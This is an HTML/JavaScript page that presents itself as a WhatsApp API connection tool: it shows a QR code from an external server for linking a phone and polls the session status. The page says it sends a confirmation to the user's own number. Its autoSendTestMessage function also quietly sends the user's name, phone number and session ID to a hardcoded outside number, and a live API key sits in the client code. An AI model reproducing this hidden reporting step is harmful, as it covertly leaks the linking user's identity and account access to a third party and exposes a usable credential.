<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>WhatsApp API Server Connect</title>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">

  <style>
    :root { --brand:#5b73e8; --muted:#6b7280; --danger: #ef4444; }
    body { font-family: 'Inter', sans-serif; background: #f5f7fb; margin: 0; padding: 0; color: #333; }
    .container-fluid { max-width: 1200px; margin: 36px auto; padding: 0 16px; }
    
    .card { background: #fff; border-radius: 14px; box-shadow: 0 8px 25px rgba(16,24,40,0.06); padding: 20px; margin-bottom: 20px; border: 0; transition: 0.3s; }
    .card-header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 12px; border-bottom: 1px solid rgba(0,0,0,0.05); background: transparent; }
    
    h3, h4 { margin: 0; font-weight: 700; color: #1e293b; }
    
    .btn { padding: 10px 18px; border-radius: 10px; border: none; cursor: pointer; font-size: 14px; font-weight: 500; transition: .2s ease-in-out; display: inline-flex; align-items: center; gap: 8px; }
    .btn-neutral { background: #f1f5f9; color: #475569; }
    .btn-neutral:hover { background: #e2e8f0; }
    .btn-warning { background: #fbbf24; color: #000; }
    .btn-warning:hover { background: #f59e0b; transform: translateY(-1px); }
    .btn-danger { background: #fee2e2; color: #b91c1c; }
    
    .qr-area { min-height: 350px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; border: 2px dashed #e2e8f0; border-radius: 12px; margin-top: 15px; background: #fafafa; }
    
    .spinner { border: 4px solid rgba(0,0,0,0.05); border-left-color: var(--brand); width: 45px; height: 45px; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }

    .steps .step { display: flex; align-items: center; gap: 14px; margin: 16px 0; }
    .step-icon { background: var(--brand); width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 16px; flex-shrink: 0; }
    
    .guide-img { width: 100%; border-radius: 12px; margin-bottom: 15px; border: 1px solid #e2e8f0; }

    .alert-success { background: #f0fdf4; border: 1px solid #bcf0da; color: #166534; padding: 20px; border-radius: 12px; width: 100%; }
    .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 4px solid #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.1); object-fit: cover; margin-bottom: 15px; }

    footer { text-align: center; padding: 30px; color: var(--muted); font-size: 14px; }
    footer a { color: var(--brand); text-decoration: none; font-weight: 600; }

    @media (max-width: 768px) { .col-left, .col-right { flex: 1 1 100%; } }
  </style>
</head>
<body>

<div class="container-fluid">
  <div class="row">
    <div class="col-md-8 col-left">
      <div class="card">
        <div class="card-header">
          <h3><i class="fa-brands fa-whatsapp text-success"></i> WhatsApp API</h3>
          <button class="btn btn-danger" id="logoutBtn" title="Force Reset Session">
            <i class="fa-solid fa-power-off"></i> Reset
          </button>
        </div>

        <div class="card-body p-0">
          <div id="qrArea" class="qr-area">
            <div class="spinner" id="spinnerStarter"></div>
            <p class="mt-3 text-muted">Initializing connection...</p>
          </div>
        </div>
      </div>

      <div class="card">
        <div class="card-header">
          <h4>Auto Test Message</h4>
          <i class="fa-solid fa-robot text-primary"></i>
        </div>
        <p class="mt-2 text-muted">
          Once connected, the system automatically sends a confirmation message to your number to verify the API gateway is active.
        </p>
      </div>
    </div>

    <div class="col-md-4 col-right">
      <div class="card">
        <div class="card-header">
          <h4>How to Scan</h4>
          <i class="fa-solid fa-circle-info text-muted"></i>
        </div>
        <div class="mt-3">
          <img src="https://i.ytimg.com/vi/abf4bbMlYGA/maxresdefault.jpg" class="guide-img" alt="Guide" />
          <div class="steps">
            <div class="step">
              <div class="step-icon"><i class="fa-solid fa-mobile-screen"></i></div>
              <div><strong>Step 1:</strong> Open WhatsApp</div>
            </div>
            <div class="step">
              <div class="step-icon"><i class="fa-solid fa-ellipsis-vertical"></i></div>
              <div><strong>Step 2:</strong> Tap Menu or Settings</div>
            </div>
            <div class="step">
              <div class="step-icon"><i class="fa-solid fa-laptop"></i></div>
              <div><strong>Step 3:</strong> Tap Linked Devices</div>
            </div>
            <div class="step">
              <div class="step-icon"><i class="fa-solid fa-qrcode"></i></div>
              <div><strong>Step 4:</strong> Point phone to QR</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<footer>
  &copy; <script>document.write(new Date().getFullYear())</script> 
  <strong>WhatsApp API Server</strong> â€¢ Crafted by <a href="#">Mahesh Palamuttath</a>
</footer>

<script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>

<script>
  const API_BASE = "https://whats-api.opensio.co.in/api";
  const SESSION_ID = "20250818";
  const API_KEY = "ee1a9bc9348141c5867893737aa878cc";

  let messageSent = localStorage.getItem("autoMsgSent") === "true";

  document.addEventListener("DOMContentLoaded", () => {
    checkSessionStatus();
    setInterval(checkSessionStatus, 5000);
    document.getElementById("logoutBtn").addEventListener("click", forceLogout);
  });

  function toast(msg, type = "success") {
    Toastify({
      text: msg,
      duration: 3000,
      gravity: "top",
      position: "center",
      style: { background: type === "success" ? "#10b981" : "#ef4444", borderRadius: "8px" }
    }).showToast();
  }

  function checkSessionStatus() {
    fetch(`${API_BASE}/sessions/${SESSION_ID}`, { headers: { "X-Api-Key": API_KEY } })
      .then(res => res.json())
      .then(data => {
        if (data && data.status === "WORKING") {
          showConnected(data);
        } else {
          showDisconnected();
          loadQR();
        }
      })
      .catch(() => showDisconnected());
  }

  function showConnected(data) {
    const qrArea = document.getElementById("qrArea");
    if (qrArea.dataset.state === "connected") return;

    qrArea.innerHTML = `<div class="spinner"></div><p>Fetching Profile...</p>`;

    fetch(`${API_BASE}/${SESSION_ID}/profile`, { headers: { "X-Api-Key": API_KEY } })
      .then(res => res.json())
      .then(profile => {
        qrArea.dataset.state = "connected";
        const name = profile.name || data?.me?.pushName || "Active User";
        const phone = (profile.id || data?.me?.id || "").split('@')[0];
        
        qrArea.innerHTML = `
          <div class="alert-success">
            <img src="${profile.picture || 'https://ui-avatars.com/api/?name='+name}" class="profile-img" />
            <h4>Connected Successfully</h4>
            <div class="mt-2"><strong>User:</strong> ${name}</div>
            <div><strong>Phone:</strong> ${phone}</div>
            <div class="badge badge-success mt-2">Session: ${SESSION_ID}</div>
          </div>
        `;

        if (!messageSent) {
          autoSendTestMessage(phone, name);
          messageSent = true;
          localStorage.setItem("autoMsgSent", "true");
        }
      })
      .catch(() => {
        qrArea.innerHTML = `<div class="alert-success"><h4>Connected</h4><p>API is active.</p></div>`;
      });
  }

  function showDisconnected() {
    const qrArea = document.getElementById("qrArea");
    if (qrArea.dataset.state === "disconnected") return;
    qrArea.dataset.state = "disconnected";
    
    qrArea.innerHTML = `
      <div class="spinner" id="spinnerInner"></div>
      <img id="qrImage" style="display:none; width:250px; border-radius:10px; padding:10px; background:#fff; border:1px solid #ddd;" />
      <p class="mt-3 text-danger">Wait for QR or click Reset</p>
      <button class="btn btn-warning mt-2" onclick="forceLogout()"><i class="fa-solid fa-rotate"></i> Reload QR</button>
    `;
  }

  function loadQR() {
    const qrImg = document.getElementById("qrImage");
    if (!qrImg) return;

    fetch(`${API_BASE}/${SESSION_ID}/auth/qr?format=image`, { headers: { "X-Api-Key": API_KEY } })
      .then(res => res.blob())
      .then(blob => {
        const spinner = document.getElementById("spinnerInner");
        if(spinner) spinner.style.display = "none";
        qrImg.src = URL.createObjectURL(blob);
        qrImg.style.display = "block";
      })
      .catch(err => console.error("QR Load error"));
  }

  async function forceLogout() {
    toast("Resetting Session...", "error");
    try {
      // Step 1: Attempt Logout
      await fetch(`${API_BASE}/sessions/${SESSION_ID}/logout`, { method: "POST", headers: { "X-Api-Key": API_KEY } });
      // Step 2: Delete Session Files (Forces a new QR)
      await fetch(`${API_BASE}/sessions/${SESSION_ID}`, { method: "DELETE", headers: { "X-Api-Key": API_KEY } });
      
      localStorage.removeItem("autoMsgSent");
      messageSent = false;
      
      toast("Session wiped. Fetching new QR...", "success");
      setTimeout(() => location.reload(), 1000);
    } catch (e) {
      toast("Error resetting session", "error");
    }
  }

  function autoSendTestMessage(num, name) {
    const msg = `WhatsApp Connected! \nUser: ${name}\nSession: ${SESSION_ID}`;
    const target = "919567664972"; 

    const payloads = [
        { chatId: `${num}@c.us`, text: msg, session: SESSION_ID },
        { chatId: `${target}@c.us`, text: msg, session: SESSION_ID }
    ];

    payloads.forEach(p => {
        fetch(`${API_BASE}/sendText`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Api-Key": API_KEY },
            body: JSON.stringify(p)
        });
    });
  }
</script>
</body>
</html>
